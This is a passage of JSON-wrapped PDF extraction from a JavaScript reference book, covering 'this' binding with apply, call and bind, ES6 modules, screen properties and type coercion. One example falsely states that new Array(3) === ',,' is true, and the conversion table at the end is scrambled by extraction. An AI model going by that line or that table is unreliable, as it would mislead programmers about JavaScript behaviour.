        "text": "Section 56.4: Apply and Call syntax and invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  apply  and  call  methods in every function allow it to provide a custom value for  this .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  print ()   {     console. log ( this . toPrint ); } print. apply ({  toPrint :   \"Foo\"   });   // >> \"Foo\" print. call ({  toPrint :   \"Foo\"   });   // >> \"Foo\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You might notice that the syntax for both the invocations used above are the same. i.e. The signature looks similar. But there is a small di\ufb00erence in their usage, since we are dealing with functions and changing their scopes, we still need to maintain the original arguments passed to the function. Both  apply  and  call  support passing arguments to the target function as follows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  speak ()   {      var  sentences  =  Array. prototype . slice . call ( arguments );     console. log ( this . name + \": \" + sentences ); } var  person  =   {  name :   \"Sunny\"   }; speak. apply ( person ,   [ \"I\" ,   \"Code\" ,   \"Startups\" ]);   // >> \"Sunny: I Code Startups\" speak. call ( person ,   \"I\" ,   \"<3\" ,   \"Javascript\" );   // >> \"Sunny: I <3 Javascript\"",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 318",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Notice that  apply  allows you to pass an  Array  or the  arguments  object (array-like) as the list of arguments, whereas, call  needs you to pass each argument separately. These two methods give you the freedom to get as fancy as you want, like implementing a poor version of the ECMAScript's native  bind  to create a function that will always be called as a method of an object from an original function.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  bind  ( func ,  obj )   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   function   ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "         return  func. apply ( obj ,  Array. prototype . slice . call ( arguments ,   1 ));      } } var  obj  =   {  name :   \"Foo\"   }; function  print ()   {     console. log ( this . name ); } printObj  =  bind ( print ,  obj ); printObj ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log \"Foo\" The  bind  function has a lot going on obj  will be used as the value of  this 1. forward the arguments to the function 2. and then return the value 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.5: Arrow function invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Version \u2265 6",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "When using arrow functions  this  takes the value from the enclosing execution context's  this  (that is,  this  in arrow functions has lexical scope rather than the usual dynamic scope). In global code (code that doesn't belong to any function) it would be the global object. And it keeps that way, even if you invoke the function declared with the arrow notation from any of the others methods here described.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  globalThis  =   this ;   //\"window\" in a browser, or \"global\" in Node.js",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  foo  =   (()   =>   this );            console. log ( foo ()   ===  globalThis );            //true var  obj  =   {  name :   \"Foo\"   }; console. log ( foo. call ( obj )   ===  globalThis );    //true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "See how  this  inherits the context rather than referring to the object the method was called on.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  globalThis  =   this ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 319",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {     withoutArrow :   function ()   {          return   this ;      },     withArrow :   ()   =>   this }; console. log ( obj. withoutArrow ()   ===  obj );        //true console. log ( obj. withArrow ()   ===  globalThis );    //true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  fn  =  obj. withoutArrow ;   //no longer calling withoutArrow as a method",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "var  fn2  =  obj. withArrow ; console. log ( fn ()   ===  globalThis );               //true console. log ( fn2 ()   ===  globalThis );              //true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 56.6: Bound invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The  bind  method of every function allows you to create new version of that function with the context strictly bound to a speci\ufb01c object. It is especially useful to force a function to be called as a method of an object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {  foo :   'bar'   };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  foo ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this . foo ; } fooObj  =  foo. bind ( obj ); fooObj ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log: bar",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.7: Method invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Invoking a function as a method of an object the value of  this  will be that object.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  obj  =   {     name :   \"Foo\" ,     print :   function   ()   {         console. log ( this . name )      } }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "We can now invoke print as a method of obj.  this  will be obj",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "obj. print ();",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will thus log: Foo",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 320",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.8: Anonymous invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Invoking a function as an anonymous function,  this  will be the global object ( self  in the browser).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  func ()   {",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     return   this ; }",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "func ()   ===  window ;   // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Version = 5",
        "font_name": "DejaVuSansMono",
        "font_size": 8,
        "img": []
    },
    {
        "text": "In ECMAScript 5's strict mode,  this  will be  undefined  if the function is invoked anonymously.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "( function   ()   {",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "     \"use strict\" ;     func (); }())",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will output",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "undefined",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 56.9: Constructor invocation",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "When a function is invoked as a constructor with the  new  keyword  this  takes the value of the object being constructed",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  Obj ( name )   {      this . name   =  name ; } var  obj  =   new  Obj ( \"Foo\" ); console. log ( obj );",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This will log { name: \"Foo\" }",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 56.10: Using let in loops instead of var (click handlers example)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Let's say we need to add a button for each piece of  loadedData  array (for instance, each button should be a slider showing the data; for the sake of simplicity, we'll just alert a message). One may try something like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( var  i  =   0 ;  i  <  loadedData. length ;  i ++)     jQuery ( \"#container\" ) . append ( \"<a class='button'>\" + loadedData [ i ] . label + \"</a>\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        . children () . last ()   // now let's attach a handler to the button which is a child",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        . on ( \"click\" , function ()   {  alert ( loadedData [ i ] . content );   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "But instead of alerting, each button will cause the",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 321",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "TypeError: loadedData[i] is unde\ufb01ned error. This is because the scope of  i  is the global scope (or a function scope) and after the loop,  i  ==   3 . What we need is not to \"remember the state of  i \". This can be done using  let :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "for ( let  i  =   0 ;  i  <  loadedData. length ;  i ++)     jQuery ( \"#container\" ) . append ( \"<a class='button'>\" + loadedData [ i ] . label + \"</a>\" )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        . children () . last ()   // now let's attach a handler to the button which is a child",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "        . on ( \"click\" , function ()   {  alert ( loadedData [ i ] . content );   });",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "An example of  loadedData  to be tested with this code:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "     var  loadedData  =   [          {  label : \"apple\" ,       content : \"green and round\"   },          {  label : \"blackberry\" ,  content : \"small black or blue\"   },          {  label : \"pineapple\" ,   content : \"weird stuff.. difficult to explain the shape\"   }      ];",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "A \ufb01ddle to illustrate this",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 322",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 57: Modules",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 57.1: De\ufb01ning a module",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In ECMAScript 6, when using the module syntax ( import / export ), each \ufb01le becomes its own module with a private namespace. Top-level functions and variables do not pollute the global namespace. To expose functions, classes, and variables for other modules to import, you can use the  export  keyword.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// not exported",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "function  somethingPrivate ()   {     console. log ( 'TOP SECRET' ) } export   const  PI  =   3.14 ; export   function  doSomething ()   {     console. log ( 'Hello from a module!' ) } function  doSomethingElse (){     console. log ( \"Something else\" ) } export   { doSomethingElse } export   class  MyClass  {     test ()   {} }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note: ES5 JavaScript \ufb01les loaded via  <script>  tags will remain the same when not using  import / export . Only the values which are explicitly exported will be available outside of the module. Everything else can be considered private or inaccessible. Importing this module would yield (assuming the previous code block is in  my - module. js ):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   *  as myModule from  './my-module.js' ; myModule. PI ;                   // 3.14 myModule. doSomething ();        // 'Hello from a module!' myModule. doSomethingElse ();    // 'Something else' new  myModule. MyClass ();        // an instance of MyClass",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "myModule. somethingPrivate ();   // This would fail since somethingPrivate was not exported",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 57.2: Default exports",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In addition to named imports, you can provide a default export.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// circle.js",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export   const  PI  =   3.14 ; export   default   function  area ( radius )   {      return  PI  *  radius  *  radius ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use a simpli\ufb01ed syntax to import the default export.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 323",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import  circleArea from  './circle' ; console. log ( circleArea ( 4 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Note that a  default export  is implicitly equivalent to a named export with the name  default , and the imported binding ( circleArea  above) is simply an alias. The previous module can be written like",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   {   default  as circleArea  }  from  './circle' ; console. log ( circleArea ( 4 ));",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can only have one default export per module. The name of the default export can be omitted.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "// named export: must have a name",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export   const  PI  =   3.14 ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "// default export: name is not required",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "export   default   function   ( radius )   {         return  PI  *  radius  *  radius ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 57.3: Importing named members from another module",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Given that the module from the De\ufb01ning a Module section exists in the \ufb01le  test. js , you can import from that module and use its exported members:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { doSomething ,  MyClass ,  PI }  from  './test' doSomething () const  mine  =   new  MyClass () mine. test () console. log ( PI )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The  somethingPrivate ()  method was not exported from the  test  module, so attempting to import it will fail:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { somethingPrivate }  from  './test' somethingPrivate ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 57.4: Importing an entire module",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "In addition to importing named members from a module or a module's default export, you can also import all members into a namespace binding.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   *  as test from  './test' test. doSomething ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "All exported members are now available on the  test  variable. Non-exported members are not available, just as they are not available with named member imports. Note:  The path to the module  './test'  is resolved by the  loader  and is not covered by the ECMAScript speci\ufb01cation - this could be a string to any resource (a path - relative or absolute - on a \ufb01lesystem, a URL to a network resource, or any other string identi\ufb01er).",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 324",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.5: Importing named members with aliases",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you may encounter members that have really long member names, such as thisIsWayTooLongOfAName () . In this case, you can import the member and give it a shorter name to use in your current module:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { thisIsWayTooLongOfAName as shortName }  from  'module' shortName ()",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can import multiple long member names like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { thisIsWayTooLongOfAName as shortName ,  thisIsAnotherLongNameThatShouldNotBeUsed as otherName }  from  'module' shortName () console. log ( otherName )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "And \ufb01nally, you can mix import aliases with the normal member import:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   { thisIsWayTooLongOfAName as shortName ,  PI }  from  'module' shortName () console. log ( PI )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 57.6: Importing with side e\ue023ects",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Sometimes you have a module that you only want to import so its top-level code gets run. This is useful for poly\ufb01lls, other globals, or con\ufb01guration that only runs once when your module is imported. Given a \ufb01le named  test. js :",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "console. log ( 'Initializing...' )",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "You can use it like this:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "import   './test'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This example will print  Initializing...  to the console.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 57.7: Exporting multiple named members",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "const  namedMember1  =  ... const  namedMember2  =  ... const  namedMember3  =  ... export   {  namedMember1 ,  namedMember2 ,  namedMember3  }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 325",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 58: Screen",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 58.1: Getting the screen resolution",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get the physical size of the screen (including window chrome and menubar/launcher):",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  width   =  window. screen . width ,     height  =  window. screen . height ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 58.2: Getting the \u201cavailable\u201d area of the screen",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get the  \u201c available \u201d  area of the screen (i.e. not including any bars on the edges of the screen, but including window chrome and other windows:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  availableArea  =   {     pos :   {         x :  window. screen . availLeft ,         y :  window. screen . availTop      },     size :   {         width :  window. screen . availWidth ,         height :  window. screen . availHeight      } };",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 58.3: Page width and height",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To get current page width and height (for any browser), e.g. when programming responsiveness:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "function  pageWidth ()   {    return  window. innerWidth   !=   null ?  window. innerWidth   :  document. documentElement   && document. documentElement . clientWidth   ?  document. documentElement . clientWidth   :  document. body   !=   null ?  document. body . clientWidth   :   null ; } function  pageHeight ()   {    return   window. innerHeight   !=   null ?  window. innerHeight   :  document. documentElement   && document. documentElement . clientHeight   ?  document. documentElement . clientHeight   :  document. body   != null ?  document. body . clientHeight   :   null ; }",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 58.4: Window innerWidth and innerHeight Properties",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Get the window height and width",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  width  =  window. innerWidth var  height  =  window. innerHeight",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 58.5: Getting color information about the screen",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "To determine the color and pixel depths of the screen:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "var  pixelDepth  =  window. screen . pixelDepth ,     colorDepth  =  window. screen . colorDepth ;",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 326",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Chapter 59: Variable coercion/conversion",
        "font_name": "Quicksand-Bold",
        "font_size": 26,
        "img": []
    },
    {
        "text": "Section 59.1: Double Negation (!!x)",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "The double-negation  !!  is not a distinct JavaScript operator nor a special syntax but rather just a sequence of two negations. It is used to convert the value of any type to its appropriate  true  or  false  Boolean value depending on whether it is  truthy  or  falsy .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "!! 1              // true !! 0              // false",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "!! undefined      // false",
        "font_name": "RobotoMono-Bold",
        "font_size": 9,
        "img": []
    },
    {
        "text": "!!{}             // true !![]             // true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The \ufb01rst negation converts any value to  false  if it is  truthy  and to  true  if is  falsy . The second negation then operates on a normal Boolean value. Together they convert any  truthy  value to  true  and any  falsy  value to  false . However, many professionals consider the practice of using such syntax unacceptable and recommend simpler to read alternatives, even if they're longer to write:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "x  !==   0          // instead of !!x in case x is a number x  !=   null        // instead of !!x in case x is an object, a string, or an undefined",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Usage of  !! x  is considered poor practice due to the following reasons: Stylistically it may look like a distinct special syntax whereas in fact it is not doing anything other than two 1. consecutive negations with implicit type conversion. It is better to provide information about types of values stored in variables and properties through the code. 2. For example,  x  !==   0  says that  x  is probably a number, whereas  !! x  does not convey any such advantage to readers of the code. Usage of  Boolean ( x )  allows for similar functionality, and is a more explicit conversion of type. 3.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.2: Implicit conversion",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "JavaScript will try to automatically convert variables to more appropriate types upon use. It's usually advised to do conversions explicitly (see other examples), but it's still worth knowing what conversions take place implicitly.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"1\"   +   5   ===   \"15\"   // 5 got converted to string. 1   +   \"5\"   ===   \"15\"   // 1 got converted to string. 1   -   \"5\"   ===   - 4   // \"5\" got converted to a number. alert ({})   // alerts \"[object Object]\", {} got converted to string. ! 0   ===   true   // 0 got converted to boolean if   ( \"hello\" )   {}   // runs, \"hello\" got converted to boolean. new  Array ( 3 )   ===   \",,\" ;   // Return true. The array is converted to string - Array.toString();",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Some of the trickier parts:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "! \"0\"   ===   false   // \"0\" got converted to true, then reversed. ! \"false\"   ===   false   // \"false\" converted to true, then reversed.",
        "font_name": "RobotoMono-Italic",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.3: Converting to boolean",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Boolean ( ... )  will convert any data type into either  true  or  false .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 327",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Boolean ( \"true\" )   ===   true Boolean ( \"false\" )   ===   true Boolean (- 1 )   ===   true Boolean ( 1 )   ===   true Boolean ( 0 )   ===   false Boolean ( \"\" )   ===   false Boolean ( \"1\" )   ===   true Boolean ( \"0\" )   ===   true Boolean ({})   ===   true Boolean ([])   ===   true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Empty strings and the number 0 will be converted to false, and all others will be converted to true. A shorter, but less clear, form:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "!! \"true\"   ===   true !! \"false\"   ===   true !!- 1   ===   true !! 1   ===   true !! 0   ===   false !! \"\"   ===   false !! \"1\"   ===   true !! \"0\"   ===   true !!{}   ===   true !![]   ===   true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "This shorter form takes advantage of implicit type conversion using the logical NOT operator twice, as described in http://stackover\ufb02ow.com/documentation/javascript/208/boolean-logic/3047/double-negation-x Here is the complete list of boolean conversions from the  ECMAScript speci\ufb01cation",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if  myArg  of type  undefined  or  null  then  Boolean ( myArg )   ===   false if  myArg  of type  boolean  then  Boolean ( myArg )   ===  myArg",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "if  myArg  of type  number  then  Boolean ( myArg )   ===   false  if  myArg  is  +0 ,  \u2011 0 , or  NaN ; otherwise  true if  myArg  of type  string  then  Boolean ( myArg )   ===   false  if  myArg  is the empty String (its length is zero); otherwise  true",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "if  myArg  of type  symbol  or  object  then  Boolean ( myArg )   ===   true",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Values that get converted to  false  as booleans are called  falsy  (and all others are called  truthy ). See Comparison Operations.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.4: Converting a string to a number",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Number ( '0' )   ===   0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Number ( '0' )  will convert the string ( '0' ) into a number ( 0 ) A shorter, but less clear, form:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "+ '0'   ===   0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "The unary  +  operator does nothing to numbers, but converts anything else to a number. Interestingly,  +(- 12 )   ===   - 12 .",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "parseInt ( '0' ,   10 )   ===   0",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "GoalKicker.com \u2013 JavaScript\u00ae Notes for Professionals 328",
        "font_name": "Quicksand-Regular",
        "font_size": 10,
        "img": []
    },
    {
        "text": "parseInt ( '0' ,   10 )  will convert the string ( '0' ) into a number ( 0 ), don't forget the second argument, which is radix. If not given, parseInt could convert string to wrong number.",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "Section 59.5: Converting a number to a string",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "String ( 0 )   ===   '0'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "String ( 0 )  will convert the number ( 0 ) into a string ( '0' ). A shorter, but less clear, form:",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "''   +   0   ===   '0'",
        "font_name": "RobotoMono-Regular",
        "font_size": 9,
        "img": []
    },
    {
        "text": "Section 59.6: Primitive to Primitive conversion table",
        "font_name": "Quicksand-Bold",
        "font_size": 18,
        "img": []
    },
    {
        "text": "Value Converted To String Converted To Number Converted To Boolean",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "unde\ufb01nded \"unde\ufb01ned\" NaN false null \"null\" 0 false true \"true\" 1 false \"false\" 0 NaN \"NaN\"",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
        "text": "\"\" empty string 0",
        "font_name": "OpenSans",
        "font_size": 10,
        "img": []
    },
    {
        "text": "false \" \" 0 true",
        "font_name": "OpenSans-Bold",
        "font_size": 10,
        "img": []
    },
    {
